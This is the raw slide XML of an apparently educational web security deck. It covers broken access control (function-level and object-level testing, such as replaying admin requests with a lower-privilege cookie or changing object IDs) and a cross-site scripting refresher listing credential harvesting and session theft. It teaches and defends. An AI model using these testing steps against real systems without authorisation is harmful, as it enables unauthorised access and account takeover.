      </p:pic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B4308B6-301B-DB9A-D323-941516AFA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8682EFAE-F7A8-C5DF-A467-3F0102EE3AEB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880800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48CD8-7204-322C-ED89-B61F6420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ECFB6-57DA-D712-2C1D-FBA80AF00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7256641" cy="90328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Function Level &amp; Object Level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A1C0E7-758B-7248-7A07-B030A70A59FA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F935AF-619C-A56F-704A-ACAE826F068A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748637-9B4F-B6C6-4D96-3C60D487A6ED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1253CE-A37D-016E-A4F4-AFA61B885887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20FB11-D80D-83DD-2790-FA2104AD4DD5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E94422-2600-8EB1-A899-D480F4F060C0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93F592-F718-E7AA-CF47-0F5588A0D685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9058F76C-3F40-C81A-4453-61C4F51AE99F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957512" y="1420412"/>
            <a:ext cx="4217012" cy="2307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Function Level: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Can you do this specific action?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2F612-CD84-699C-D660-17E6E1875FA2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7174524" y="1420412"/>
            <a:ext cx="4898413" cy="2670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Object Level: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Can you do this specific action </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>on this specific piece of data?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRP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4C3A06-884F-DCE3-813C-71A5649E108B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957512" y="4358668"/>
            <a:ext cx="3701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POST /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>newpost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GET   /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>allposts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2AA34-A25C-6985-3574-98B2E9AE79F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7174524" y="4358668"/>
            <a:ext cx="4431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GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/post/1337</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PUT /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/post/1257</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4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47908E47-C708-C66B-0E0A-A0337499D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D7EE9E0-F820-C4F8-5428-CB16504CA6BE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519623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4F30C-7AAE-D719-E663-97E7337C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B554-C2AE-6FE3-1BCF-74AD3822C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Function Level &amp; Object Level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A1C519-D735-104B-4938-815BFD6CC942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4EE1BF-5674-B6E6-DDFD-97112FBB065E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635C0D-678E-5F32-544C-2467D7D3E0C3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9DC23A-D26D-2B2B-FA9F-5DB3FA82DA70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7C2F23-2E42-3AE1-39E7-1876B02ED460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07B33E-A090-7774-182F-CF05E8F0FBF2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F8A4CC-EF4B-B74A-9CF9-ECDF327C073E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83ADD1BC-3CF7-479B-1C18-341F62204E59}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957512" y="1420412"/>
            <a:ext cx="4217012" cy="531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Function Level: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Capture requests from an admin user.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Login as a lower-privilege user and copy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>authToken</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> cookie.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Re-send admin request using that cookie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5180C-6CD4-D82C-1679-38A2BD4DB375}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7174524" y="1420411"/>
            <a:ext cx="4898413" cy="5317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Object Level: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View something that belongs only to the user you’re logged in as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Replay or intercept the request and change the ID value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Use different ID values to find claims not created by you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4" name="Picture 3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E8F03636-A89E-AF1C-4718-3FB280DB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7CB7D70-3E42-CB86-AE60-C8846F6ABC57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580495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D8776F-239C-830F-2BC5-941198A7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B080-1458-3EAE-B4F5-06B5B180F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Examine Claim Application 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60B41-375A-9A30-3EDD-F312CFD3769E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16F000-4CD3-6740-1646-4604A6B09F5F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0A36A8-A182-BFD1-F91C-71AAB7CC9C5D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17EE40-2EC7-B89D-B406-9483E3907B95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56456E-8401-44CD-3DE3-63C441478639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D8B9B4-BBAA-4788-C91D-45826F6C0606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D2AAC4-3A67-7238-0097-D05B54489ACD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8C11D9F1-9778-4C5E-7F97-3762025254C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1420411"/>
            <a:ext cx="8683503" cy="5317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How and where does the application store your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>session token?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What different API endpoints are there are on the backend for all the different user types?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What access restrictions appear to exist (based on the frontend)?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Make enough requests using Burp Suite’s Browser that the application gets sufficiently mapped out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FD6A955C-4ABC-94D0-BD1A-40CE70D4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39EF6DB2-F8D2-F7A4-0EA0-005889D4976F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110692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1076F-0438-6958-7C86-A19A7BCA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82FC-594D-E42D-F50D-E71C26A61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Claim Application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33072-8BBF-8626-5ACD-45491EA3AA32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1B4BF-A133-1293-F66B-7EBD90C7E508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DE733E-2F8D-4D98-088C-ADCDDB1565E5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DBE3C2-3183-1C37-0016-6B9996786D8E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D8A651-36BA-6FB8-A9DA-4E5477AA6329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339D-6E51-5EBC-4D6C-2E406A936B97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FB6D04-41F5-6E06-6B09-736C320C81B0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DAE4ED49-22D2-04D0-C01C-E734A0534595}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1420411"/>
            <a:ext cx="8683503" cy="5317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Function Level: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Learn about a function that certain users are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>not allowed to perform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Attempt the functionality with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a session token </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>from a user who </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shouldn’t be able to do the action</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" i="1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Object Level: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Identify an object that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>has specific user ownership permissions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(look for an ID in the API endpoint path)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Attempt accessing an object that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>does not belong to the given user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07C086F8-8264-EA24-D3A6-9A50D63AD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5DE82AF-3689-1A07-93E2-D4BB0EE9540A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334096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A1532-252F-C8D1-5C8B-30557B39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BEDB4F-AFA9-0F39-D828-6AD18D6B9562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089D5-0667-70EC-18A3-63C11FC3AED8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0BF95E-9AE8-79C9-3232-22E24817CDE1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2A6A2C-EED9-87A5-9E02-62A93AFB09BC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CDE8A4-23DF-AA6F-FEED-7B278F058F69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9CBD20-068E-C579-BA99-822A95C6A2D5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4D6A3C-6134-BC58-59AE-115DC01E0ED2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34BA68A1-45F3-DAA1-6CF4-8143125F926A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957512" y="1420413"/>
            <a:ext cx="2881585" cy="53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Object Level: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C601CBC-73B0-083A-A3FD-0F2D6C7B6A88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8387306" y="1357618"/>
            <a:ext cx="2881585" cy="53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server.js:180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117F4F6-2E28-AFA9-AEDF-BF8C55345CC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="119859"/>
            <a:ext cx="9258299" cy="9032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</a:rPr>
              <a:t>Review: Broken Access Control</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1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A645B0D-252B-06CB-ADBB-9371849E1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E8F1679-8B41-A7D9-8B78-3267AD651D21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85C6C-247B-9441-0293-889B6F705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440" y="1896634"/>
            <a:ext cx="7111434" cy="491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32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0239A-1D4C-0DC7-4EF3-F0B3A298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E06C6B-8CC2-0426-E897-293669DC50E4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2554BF-4408-CEEF-DC91-6BF498828687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E5215A-7AC8-E919-6BB3-70011C01F616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542936-4A6C-D763-4BD9-21BF31338D1D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2C7D76-DA5C-D13F-9382-D73C7C5B7FF7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1AF410-2409-1396-4A3A-9042D818462A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DC4BAF-5F6C-7A3E-6BA1-628DC8E1E1CE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4BA28659-8FAC-99CE-480D-896BECAC0DD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957512" y="1420413"/>
            <a:ext cx="2881585" cy="53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Function Level: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3B80C0-F267-5AEC-7527-7294C04E43B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="119859"/>
            <a:ext cx="9258299" cy="9032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</a:rPr>
              <a:t>Review: Broken Access Control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5F2F4-7309-D19A-5A33-1854F93D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828" y="4154437"/>
            <a:ext cx="7772400" cy="25009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B37999-C1F3-0DE7-A36A-4748F21A0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208" y="1864249"/>
            <a:ext cx="7772400" cy="229018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6A9DC705-BF27-EB08-C221-E7DEBA454542}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7549513" y="3393503"/>
            <a:ext cx="2881585" cy="53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server.js:250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EF1D6B8-D421-3301-3138-A1D582F7EC42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8029643" y="6199125"/>
            <a:ext cx="2881585" cy="539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server.js:64</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1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E18AFB99-A996-ADA5-248F-D255D353CB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8625CDE-7B83-F607-4E7B-81FF83D78A85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492818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BB47E-C064-790D-17DA-A537B9D9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D211-F744-C2D6-AD9C-B781E2E3D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Review: Broken Access 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D0571A-73BC-C887-FC63-965089F12791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ECA751-8214-034C-FDA6-BED5B82C7427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10213D-8135-27DC-9BD6-6E4B64A6DCDB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49B96A-B2BF-4D95-FEDA-A3F61DB97B99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777AFC-6494-57E2-AFA4-3F4915459061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82043D-0938-8CE6-FCE0-D19FB4233556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2C2A87-BE86-B5F2-9EAE-4FA9EFFFF036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5CA3E4C5-B992-74BE-A55E-660E40034F15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957512" y="1420412"/>
            <a:ext cx="8812122" cy="417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Why has this been a major problem for 5+ years?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"100% of the applications tested were found to have some form of broken access control" – OWASP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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AEA5AA2C-A377-0887-17DA-C5E74A086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E0BC7FB-10DC-72D1-4BF0-CA522D02DE83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733936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72F30-3E21-CB21-98F3-B3FF54DDA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0B6F-664A-FA1C-7917-BB4947431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Review: Broken Access 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9D0AE9-92A9-2768-FCDF-628D9E1997EC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A0AA7D-1685-5BF0-B5FB-802928311F05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74FBA4-9BF0-9CAF-C5A5-568F3D92DD82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B5A24A-7C66-6730-47D0-25D0B4845564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E0DFD7-416B-5737-9A63-A62EBB73886A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5F7043-DFD2-5549-721A-5635A53E7A63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60E855E-F93D-97D7-8501-58C2AE55D8E1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8A791FD9-4E49-FA20-3B30-09AC97CCD9D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957512" y="1420412"/>
            <a:ext cx="8812122" cy="417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Why has this been a major problem for 5+ years?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"100% of the applications tested were found to have some form of broken access control" – OWASP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Authorization logic is complex and context-specific.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Automated tools lack business context and often miss these flaws.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Many developers conflate authentication with authorization.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Manual testing and understanding of business rules are often required to find such flaws.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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89AED03-3B14-6D17-76AE-8365D35E955D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="5437588"/>
            <a:ext cx="8812122" cy="10798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solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>owasp.org</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/Top10/2025/A01_2025-Broken_Access_Control/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https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>owasp.org</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/www-community/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Broken_Access_Control</a:t>
            </a:r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https://auth0.com/blog/why-broken-access-control-still-dominates-owasp-top-10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5EAE422-35E0-EF13-BF9C-C75B9E5BA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3066970-FBD7-603B-6FEA-180833AF9059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620499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D880A-9ABD-FE0F-3B8F-900B31073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29C7-07CD-D942-E44F-89511EB1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Cross-Site Scripting Refresher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9B5B46-6C6D-0558-C45F-04FE5EEBE685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725672-04B6-2EE4-2666-F8B0B66C5149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502F45-B3B2-2B44-2001-BA0614A40F89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C26DB1-0C9A-B32C-87FB-5C85A6F2A3D3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4E4465-794E-7E94-014C-CECAB2E18692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1DCD4A-E2EB-BC90-0448-CFF82D83FA8F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390F10-4E81-6DDD-ADBB-3BE56E624575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8D00EC13-2832-ADBC-E19F-4616C2C4EAB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1420412"/>
            <a:ext cx="8683503" cy="4968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An XSS attack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>runs attacker’s JavaScript within the context of the application</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.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Anything the application can do with JavaScript, an attacker’s XSS payload can do it too. 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B0563D1F-58B0-95C5-5DA7-8A3BE9CB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3E3C50A8-8396-CEE3-12E8-CC8D841A64AC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324564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42D27-31A3-8D10-F1FE-B47D645C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A416-B7FE-79A1-149D-D5E20B574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Cross-Site Scripting Refresher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CB7AC-9BCB-B5D8-8966-0EDDD81CCD2C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D4B932-6884-E91A-C902-C90E1484EB17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674FD8-921A-E1A7-27CE-F4567876B842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10994A-AE32-E70F-47DC-D89DA656A667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4D7790-0F9A-A41A-CDAA-DC63946DCFFC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DDFF9C-FDF8-DF1B-D4A9-DEE34C2FE2A7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E4889B-EC97-E9CC-4DA5-62819C008536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09DD4620-A8C8-22F1-7B38-ED3498A14218}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1420411"/>
            <a:ext cx="8942752" cy="5317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An XSS attack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>runs attacker’s JavaScript within the context of the application</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.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Anything the application can do with JavaScript, an attacker’s XSS payload can do it too.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Modify Page Content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Inject fake forms (harvest credentials)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Hide or disable UI elements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&gt; Changes links to point to attacker’s site</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&gt; Read unprotected session information (account takeover)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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1645C800-27EB-1D74-38BE-3CA774323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87F0A-622E-917A-10CC-EE30FE60E4E9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893335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415E3-0098-848C-AAB8-F7960880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B5BC-7510-30E4-F394-1CABE7271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</a:rPr>
              <a:t>Cross-Site Scripting Refresher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BE99E-023B-F7A5-06DC-15AB7CCE6691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7A28D6-F681-D7A5-6BDC-E5AB42FF22BE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FA7447-1F03-7F35-5435-682E24B8A953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31D6A8-B74E-79BE-4A8B-3D5F3D2A951A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4DC8A3-599C-176B-8D75-9F9325F914E9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85F31F-2209-CE7F-8A88-6278425E6B52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06BC453-2166-0A36-23C6-29EC9A1D7420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346AC328-236E-F3C1-0FDB-03E2B754EC13}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1420412"/>
            <a:ext cx="3448589" cy="5262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Stored XSS Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A pixel art of a green character holding a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5E9D103-69C7-63AC-B619-F2EFE7998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408" y="2431143"/>
            <a:ext cx="1473200" cy="14732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E36659-2A87-9746-9441-4A1F9E5701D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4812253" y="2767699"/>
            <a:ext cx="1345474" cy="661302"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="67CA9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&lt;/XSS&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="A white and green web page&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76112050-6B21-535E-741B-EB85B9D92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880" y="4352519"/>
            <a:ext cx="1842220" cy="1842220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="A pixelated cartoon of a cactus sitting on a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{998F93CF-5EC5-F21B-C4FA-2DD255E6E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5408" y="4700989"/>
            <a:ext cx="1473201" cy="14732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B9B9B3-2944-54E4-6FE8-9BDC7DEC3C94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157727" y="2987630"/>
            <a:ext cx="2568262" cy="110720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6" descr="Database with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA974DA5-11B0-54E5-7252-2F6AAF8683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5989" y="2062246"/>
            <a:ext cx="1975659" cy="1975659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B2A18EDA-8044-054D-074B-62EC7B939A39}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8233956" y="1775204"/>
            <a:ext cx="3033328" cy="4998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Backend Server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7DA42D1-E5BE-E7F6-3DD4-5359D0C9CE91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5484990" y="4812847"/>
            <a:ext cx="1345474" cy="661302"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="67CA9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&lt;/XSS&gt;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C319BCE-F45E-3D72-CC78-D1568D24FAEC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6747950" y="3759651"/>
            <a:ext cx="1975659" cy="1053196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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04C4488A-561B-757D-BCCB-666C8F0A5176}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7248304" y="4861264"/>
            <a:ext cx="4819878" cy="1002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JavaScript payload runs on another user’s browser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4D12750-E06F-78F1-14FD-2D55A139BC1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2762578" y="6252699"/>
            <a:ext cx="9310359" cy="52531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An application vulnerable to XSS is dangerous for users to use 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83C6276E-5A1F-A2D0-C942-DAA364E49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8F22CAB-5D8E-096F-2FD8-C046DE085B4B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3894275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4D24F-D129-F9D8-1282-49F4DC9E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25F0-4B7F-C1E9-3222-C6A923515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Cross-Site Scripting Refresher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13C65-3D1B-36C5-CB19-36C018191D44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5EE510-5A2C-7D49-06E8-923EB7994714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F13D6C-6A0B-7EE3-2FC4-17CBA1FFC041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12A922-8884-6D61-9255-D72565996222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7661F9-2706-935C-3E55-3E2F24963EEB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B22BE2-E4B4-ED13-0CBF-0A88AAAF03A0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67AD4F-D702-D0AE-831A-FA2EC8AA527B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5CD61068-EFE4-1C2A-FF21-E6EE58D002C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
